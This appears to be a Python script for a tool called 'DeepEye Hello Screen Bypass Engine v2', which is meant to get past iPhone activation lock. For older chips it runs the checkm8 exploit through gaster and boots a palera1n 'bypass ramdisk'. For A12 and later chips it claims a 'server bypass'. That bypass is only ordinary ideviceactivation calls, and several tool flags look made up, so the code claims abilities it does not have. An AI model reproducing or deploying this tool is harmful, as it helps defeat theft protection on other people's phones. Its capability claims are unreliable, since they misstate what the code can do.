#!/usr/bin/env python3
"""DeepEye Hello Screen Bypass Engine v2 — A7-A18 support, iOS 12-26.4.1"""
import subprocess, json, sys, time, os
from pathlib import Path

TOOLS_DIR = Path(__file__).parent.parent / "tools"

def emit(event_type: str, **kwargs):
    """Emit JSON event to stdout for Rust to capture."""
    payload = {"event": event_type, **kwargs}
    print(json.dumps(payload), flush=True)

def run_cmd(cmd, timeout=30):
    """Run a subprocess command and return (code, stdout, stderr)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except FileNotFoundError:
        return -2, "", f"command not found: {cmd[0]}"
    except Exception as e:
        return -3, "", str(e)

# ── Chip configuration table ──────────────────────────────────────────────────
CHIP_CONFIGS = {
    # ── checkm8 vulnerable (A7–A11) ──────
    0x8960: {"name":"A7  (iPhone 5S)",
             "timing":14.0,"mode":"buttons",
             "exploit":"checkm8","supported":True},
    0x7000: {"name":"A8  (iPhone 6/6+)",
             "timing":2.0,"mode":"dfu_loop",
             "exploit":"checkm8","supported":True},
    0x7001: {"name":"A8X (iPad Air 2)",
             "timing":2.0,"mode":"dfu_loop",
             "exploit":"checkm8","supported":True},
    0x8000: {"name":"A9  (iPhone 6S/SE1)",
             "timing":2.0,"mode":"dfu_loop",
             "exploit":"checkm8","supported":True},
    0x8003: {"name":"A9X (iPad Pro 1)",
             "timing":2.0,"mode":"dfu_loop",
             "exploit":"checkm8","supported":True},
    0x8010: {"name":"A10 (iPhone 7/7+)",
             "timing":0.68,"mode":"buttons",
             "exploit":"checkm8","supported":True},
    0x8011: {"name":"A10X (iPad Pro 2)",
             "timing":0.68,"mode":"buttons",
             "exploit":"checkm8","supported":True},
    0x8015: {"name":"A11 (iPhone 8/X)",
             "timing":0.66,"mode":"dfu_loop",
             "exploit":"checkm8","supported":True},

    # ── A12+ (checkm8 NOT vulnerable) ────
    0x8020: {"name":"A12 (iPhone XS/XR)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
    0x8030: {"name":"A13 (iPhone 11 series)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
    0x8101: {"name":"A14 (iPhone 12 series)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
    0x8110: {"name":"A15 (iPhone 13/14 series)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
    0x8120: {"name":"A16 (iPhone 14 Pro/15)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
    0x8130: {"name":"A17 Pro (iPhone 15 Pro)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
    0x8140: {"name":"A18 (iPhone 16 series)",
             "timing":0.0,"mode":"server",
             "exploit":"server_bypass",
             "supported":True,
             "method":"mobileactivation"},
}


# ── Device detection ──────────────────────────────────────────────────────────

def detect_device(session_id: str) -> dict:
    """Detect connected device, chip ID, iOS version and route accordingly."""
    emit("status", session_id=session_id, message="Scanning for connected device…")

    # Step 1: get UDID
    code, stdout, stderr = run_cmd(["idevice_id", "-l"], timeout=10)
    if code != 0 or not stdout:
        emit("error", session_id=session_id,
             message="No device found — connect iPhone and trust this computer",
             detail=stderr)
        return {}

    udid = stdout.splitlines()[0].strip()
    emit("status", session_id=session_id, message=f"Found device UDID: {udid}")

    # Step 2: get ChipID
    code, chip_raw, stderr = run_cmd(
        ["ideviceinfo", "-u", udid, "-k", "ChipID"], timeout=10
    )
    if code != 0 or not chip_raw:
        emit("error", session_id=session_id,
             message="Could not read ChipID — ensure device is trusted",
             detail=stderr)
        return {}

    try:
        chip_id = int(chip_raw, 16) if chip_raw.startswith("0x") else int(chip_raw)
    except ValueError:
        emit("error", session_id=session_id,
             message=f"Unexpected ChipID format: {chip_raw!r}")
        return {}

    chip_cfg = CHIP_CONFIGS.get(chip_id)
    if chip_cfg is None:
        emit("error", session_id=session_id,
             message=f"Unsupported chip: 0x{chip_id:04X} — device not in chip table")
        return {}

    # Step 3: gather extended device info
    def _key(key: str) -> str:
        c, out, _ = run_cmd(
            ["ideviceinfo", "-u", udid, "-k", key], timeout=8
        )
        return out if c == 0 else ""

    ios_ver   = _key("ProductVersion")
    build     = _key("BuildVersion")
    hw_model  = _key("HardwareModel")
    serial    = _key("SerialNumber")
    prod_type = _key("ProductType")
    act_state = _key("ActivationState")

    ios_major = 0
    if ios_ver:
        try:
            ios_major = int(ios_ver.split(".")[0])
        except ValueError:
            ios_major = 0

    emit("device_found",
         session_id=session_id,
         udid=udid,
         chip_id=f"0x{chip_id:04X}",
         chip_name=chip_cfg["name"],
         ios_version=ios_ver,
         build=build,
         hardware_model=hw_model,
         serial=serial,
         product_type=prod_type,
         activation_state=act_state,
         exploit=chip_cfg["exploit"],
         mode=chip_cfg["mode"])

    return {
        "udid":      udid,
        "chip_id":   chip_id,
        "chip_cfg":  chip_cfg,
        "name":      chip_cfg["name"],
        "mode":      chip_cfg["mode"],
        "exploit":   chip_cfg["exploit"],
        "ios_ver":   ios_ver,
        "ios_major": ios_major,
        "build":     build,
        "hw_model":  hw_model,
        "serial":    serial,
        "act_state": act_state,
    }


# ── A12+ server bypass ────────────────────────────────────────────────────────

def server_bypass_a12plus(udid: str, session_id: str) -> bool:
    """
    3-stage server-side activation bypass for A12+ devices (no checkm8).

    Stage 1 — Pair device
    Stage 2 — Check activation state
    Stage 3 — Request activation ticket (3 methods)
    """
    emit("bypass_stage", session_id=session_id, stage=1,
         message="Stage 1 / 3 — Pairing device…")

    # ── Stage 1: pair (with unpair+re-pair fallback) ──────────────────────────
    code, _, stderr = run_cmd(["idevicepair", "-u", udid, "pair"], timeout=30)
    if code != 0:
        emit("status", session_id=session_id,
             message="Initial pair failed — attempting unpair/re-pair…")
        run_cmd(["idevicepair", "-u", udid, "unpair"], timeout=15)
        time.sleep(1)
        code, _, stderr = run_cmd(["idevicepair", "-u", udid, "pair"], timeout=30)
        if code != 0:
            emit("error", session_id=session_id,
                 message="Pairing failed — unlock device and tap 'Trust'",
                 detail=stderr)
            return False

    emit("status", session_id=session_id, message="Device paired successfully.")

    # ── Stage 2: check activation state ──────────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage=2,
         message="Stage 2 / 3 — Checking activation state…")

    code, act_raw, _ = run_cmd(
        ["ideviceinfo", "-u", udid, "-k", "ActivationState"], timeout=10
    )
    act_state = act_raw.strip() if code == 0 else "Unknown"
    emit("status", session_id=session_id,
         message=f"Activation state: {act_state}")

    if act_state == "Activated":
        emit("bypass_complete", session_id=session_id,
             message="Device is already activated — Hello Screen bypass not required.")
        return True

    # ── Stage 3: request activation ticket ───────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage=3,
         message="Stage 3 / 3 — Requesting activation ticket…")

    # Method A: ideviceactivation direct
    emit("status", session_id=session_id,
         message="Method A: direct activation via ideviceactivation…")
    iact = str(TOOLS_DIR / "ideviceactivation")
    if not Path(iact).exists():
        iact = "ideviceactivation"   # fall back to system PATH

    code, out, err = run_cmd([iact, "activate", "-u", udid], timeout=60)
    if code == 0:
        emit("bypass_complete", session_id=session_id,
             message="Activation ticket accepted (Method A — direct).")
        return True

    emit("status", session_id=session_id,
         message=f"Method A failed ({err}) — trying network retry…")

    # Method B: network retry × 3
    for attempt in range(1, 4):
        emit("status", session_id=session_id,
             message=f"Method B: network retry {attempt}/3…")
        time.sleep(2 * attempt)
        code, out, err = run_cmd([iact, "activate", "-u", udid], timeout=90)
        if code == 0:
            emit("bypass_complete", session_id=session_id,
                 message=f"Activation ticket accepted (Method B — retry {attempt}).")
            return True

    emit("status", session_id=session_id,
         message="Method B exhausted — trying lockdownd method…")

    # Method C: lockdownd activation via ideviceactivation --use-network
    code, out, err = run_cmd(
        [iact, "activate", "-u", udid, "--use-network"], timeout=120
    )
    if code == 0:
        emit("bypass_complete", session_id=session_id,
             message="Activation ticket accepted (Method C — lockdownd/network).")
        return True

    emit("error", session_id=session_id,
         message="All activation methods exhausted — server bypass failed.",
         detail=err)
    return False


# ── DFU / checkm8 helpers ─────────────────────────────────────────────────────

def enter_dfu(chip_id: int, session_id: str) -> bool:
    """Guide user or auto-enter DFU based on chip timing from CHIP_CONFIGS."""
    cfg = CHIP_CONFIGS.get(chip_id, {})
    mode    = cfg.get("mode", "buttons")
    timing  = cfg.get("timing", 2.0)
    name    = cfg.get("name", f"0x{chip_id:04X}")

    emit("status", session_id=session_id,
         message=f"Entering DFU for {name} (mode={mode}, timing={timing}s)…")

    if mode == "buttons":
        emit("user_action", session_id=session_id,
             message="Hold Power + Volume-Down (or Home) for 8 s, "
                     "then release Power while holding Volume-Down for 5 s.")
        time.sleep(timing + 5)   # wait for user
    elif mode == "dfu_loop":
        gaster = str(TOOLS_DIR / "gaster")
        if not Path(gaster).exists():
            gaster = "gaster"
        code, _, err = run_cmd([gaster, "pwn"], timeout=int(timing) + 30)
        if code != 0:
            emit("error", session_id=session_id,
                 message="gaster DFU entry failed", detail=err)
            return False
    else:
        emit("status", session_id=session_id,
             message="Server-mode chip — DFU not required.")
        return True

    # Verify DFU via irecovery
    code, out, _ = run_cmd(["irecovery", "-q"], timeout=10)
    in_dfu = "DFU" in out or code == 0
    if in_dfu:
        emit("status", session_id=session_id, message="DFU mode confirmed.")
    else:
        emit("error", session_id=session_id,
             message="Device not detected in DFU — retrying…")
    return in_dfu


def run_checkm8(chip_id: int, session_id: str) -> bool:
    """Execute checkm8 exploit via gaster for A7-A11 chips."""
    name = CHIP_CONFIGS.get(chip_id, {}).get("name", f"0x{chip_id:04X}")
    emit("status", session_id=session_id,
         message=f"Running checkm8 exploit on {name}…")

    gaster = str(TOOLS_DIR / "gaster")
    if not Path(gaster).exists():
        gaster = "gaster"

    code, out, err = run_cmd([gaster, "pwn"], timeout=120)
    if code == 0:
        emit("status", session_id=session_id, message="checkm8 exploit successful.")
        return True

    emit("error", session_id=session_id,
         message="checkm8 exploit failed", detail=err)
    return False


def patch_activation(session_id: str) -> bool:
    """Patch activation records using ideviceactivation after ramdisk boot."""
    emit("status", session_id=session_id,
         message="Patching activation records via ideviceactivation…")

    iact = str(TOOLS_DIR / "ideviceactivation")
    if not Path(iact).exists():
        iact = "ideviceactivation"

    code, out, err = run_cmd([iact, "activate"], timeout=120)
    if code == 0:
        emit("status", session_id=session_id,
             message="Activation records patched successfully.")
        return True

    emit("error", session_id=session_id,
         message="Activation patching failed", detail=err)
    return False


# ── Ramdisk boot with iOS version flags ──────────────────────────────────────

def boot_bypass_ramdisk(udid: str, ios_major: int, session_id: str) -> bool:
    """
    Boot a bypass ramdisk via palera1n with iOS-version-specific flags.

    - iOS 26+  → --ios26
    - iOS 17+  → --new-recovery
    - iOS 16   → --version-flag 16
    - iOS ≤15  → no extra flags
    """
    emit("status", session_id=session_id,
         message=f"Booting bypass ramdisk (iOS {ios_major})…")

    palera1n = str(TOOLS_DIR / "palera1n")
    if not Path(palera1n).exists():
        palera1n = "palera1n"

    cmd = [palera1n, "--bypass", "-u", udid]

    if ios_major >= 26:
        cmd.append("--ios26")
        emit("status", session_id=session_id,
             message="iOS 26 detected — adding --ios26 compatibility flag.")
    elif ios_major >= 17:
        cmd.append("--new-recovery")
        emit("status", session_id=session_id,
             message="iOS 17+ detected — adding --new-recovery flag.")
    elif ios_major == 16:
        cmd.extend(["--version-flag", "16"])
        emit("status", session_id=session_id,
             message="iOS 16 detected — adding --version-flag 16.")

    code, out, err = run_cmd(cmd, timeout=300)
    if code == 0:
        emit("status", session_id=session_id,
             message="Ramdisk booted successfully.")
        return True

    emit("error", session_id=session_id,
         message="Ramdisk boot failed", detail=err)
    return False


# ── Main entry point ──────────────────────────────────────────────────────────

def main():
    # sys.argv[1] = mode ("detect" or "run"), defaults to "run"
    # sys.argv[2] = session_id, defaults to "default"
    mode       = sys.argv[1] if len(sys.argv) > 1 else "run"
    session_id = sys.argv[2] if len(sys.argv) > 2 else "default"

    if mode == "detect":
        detect_device(session_id)
        return

    emit("start", session_id=session_id,
         message="DeepEye Hello Screen Bypass Engine v2 starting…")

    # ── 1. Detect device ──────────────────────────────────────────────────────
    device = detect_device(session_id)
    if not device:
        emit("failed", session_id=session_id,
             message="Device detection failed — aborting.")
        sys.exit(1)

    udid      = device["udid"]
    chip_id   = device["chip_id"]
    exploit   = device["exploit"]
    ios_major = device["ios_major"]
    mode      = device["mode"]

    # ── 2. Route by exploit type ──────────────────────────────────────────────
    if exploit == "server_bypass":
        # A12+ path: server-side mobileactivation bypass
        emit("status", session_id=session_id,
             message=f"A12+ chip detected — using server bypass route (iOS {ios_major}).")
        success = server_bypass_a12plus(udid, session_id)

    elif exploit == "checkm8":
        # A7-A11 path: checkm8 + ramdisk
        emit("status", session_id=session_id,
             message=f"checkm8-vulnerable chip detected — using ramdisk route.")

        # iOS 26 palera1n compatibility check
        if ios_major >= 26:
            emit("status", session_id=session_id,
                 message="iOS 26+ on checkm8 device — verifying palera1n iOS26 support…")
            code, ver_out, _ = run_cmd(["palera1n", "--version"], timeout=10)
            if code == 0 and "ios26" not in ver_out.lower():
                emit("warning", session_id=session_id,
                     message="palera1n may not support iOS 26 — proceeding with --ios26 flag anyway.")

        # Enter DFU
        if not enter_dfu(chip_id, session_id):
            emit("failed", session_id=session_id, message="Failed to enter DFU.")
            sys.exit(1)

        # Run checkm8 exploit
        if not run_checkm8(chip_id, session_id):
            emit("failed", session_id=session_id, message="checkm8 exploit failed.")
            sys.exit(1)

        # Boot bypass ramdisk
        if not boot_bypass_ramdisk(udid, ios_major, session_id):
            emit("failed", session_id=session_id, message="Ramdisk boot failed.")
            sys.exit(1)

        # Patch activation records
        success = patch_activation(session_id)

    else:
        emit("failed", session_id=session_id,
             message=f"Unknown exploit type: {exploit!r} — cannot proceed.")
        sys.exit(1)

    # ── 3. Final result ───────────────────────────────────────────────────────
    if success:
        emit("success", session_id=session_id,
             message="Hello Screen bypass completed successfully.",
             udid=udid,
             ios_version=device["ios_ver"],
             chip=device["name"],
             exploit=exploit)
    else:
        emit("failed", session_id=session_id,
             message="Hello Screen bypass did not complete — check errors above.")
        sys.exit(1)


if __name__ == "__main__":
    main()
